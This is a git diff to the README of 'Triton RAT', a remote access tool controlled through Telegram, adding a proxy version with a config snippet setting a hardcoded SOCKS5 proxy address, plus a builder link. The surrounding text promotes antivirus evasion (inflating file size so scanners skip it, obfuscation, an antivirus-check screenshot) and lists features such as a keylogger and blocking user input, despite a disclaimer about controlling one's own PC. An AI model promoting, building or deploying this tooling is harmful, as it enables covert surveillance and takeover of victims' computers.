@@ -26,7 +26,11 @@ I'm not responding for your action!
 ## :dart: About ##
 
 **With this tool you can control with YOUR pc remotly using telegram**
+
 That you need only hand (2 optional) , exe file that you will get from pyinstaller and telegram account
+
+**If telegram api is not supported in your country use Triton_Rat_Proxy(I wrote about it⬇️)**
+
 You can also build exe with builder. Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">Triton_RAT-gui</a>
 
 <p align="left"> <a href="https://twitter.com/" target="blank"><img src="https://img.shields.io/twitter/follow/?logo=twitter&style=for-the-badge" alt="" /></a> </p>
@@ -117,7 +121,23 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 <a href="https://ibb.co/qWKpdkM"><img src="https://i.ibb.co/VQRTt2W/25.png" alt="23" border="0" /></a>
 <h4>Download here: https://github.com/WhiteeRabbit/fake_file_resizer/</h4>
 
-## You can use:
+
+## 🏗️ Triton_Rat_Gui Builder (Huge thanks to [jayjayQy42](https://github.com/jayjayQy42)):  ##
+<h3>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">https://github.com/jayjayQy42/Triton_RAT-gui</a></h3>
+<h3>This man created builder for Triton rat, don't forget support him also!</h3>
+
+## 🛜 Triton_Rat V2 Proxy: ##
+If the telegram api does not work in your country, then use the version with a proxy. In the proxy version, everything works the same as in the regular version.
+But if you are not satisfied with the proxy server or the proxy server is closed, then please write this in the issues of repo or just find a proxy that works(so that it supports socks5). My proxy is free, so I am not responsible for what will happen. Use hte proxy version at your own risk. And if you change it to your paid or find a better one you can safely use it. 
+## To change the proxy just change the line(26) from the code:
+    try:
+       telebot.apihelper.proxy = {
+        'http': 'socks5://68.71.240.210:4145' - change this to your proxy
+    }
+    bot = telebot.TeleBot('YOUR_API_TOKEN')
+    except Exception as e:
+       pass
+## ⚒️ You can use ⚒️ :
     **🛠️ System Commands**
     - ⚙️ **/start** - Start the program
     - ⚙️ **/help** - Help with commands
@@ -218,16 +238,12 @@ Antiviruses, seeing the file size that it is large, will stupidly not check it! 
 ## Antivirus check (with help of second obfuscation(minifying) method (i wrote about that⬆️)) ##
 ![Снимок экрана (26)](https://github.com/user-attachments/assets/1e5020f4-207a-4125-81be-a98371923f02)
 
-## 🏗️ Triton_Rat_Gui Builder (Huge thanks to [jayjayQy42](https://github.com/jayjayQy42)):  ##
-<h3>Triton RAT GUI Builder: <a href="https://github.com/jayjayQy42/Triton_RAT-gui">https://github.com/jayjayQy42/Triton_RAT-gui</a></h3>
-<h3>This man created builder for Triton rat, don't forget support him also!</h3>
-
-
 
 ## Triton_Rat V2 update features: ##
 - **New interface and desing**
 - **Added more than 10 new functions(also keylogger,metadata ,pc info and etc...)**
 - **Added: minimaze ,maximize ,rotate monitor ,metadata ,keylogger, block/unblock user input ,better information about pc (from bios to battery) and etc... ☺️**
+- **Added proxy version**
 - **Fixed bugs**
 
 
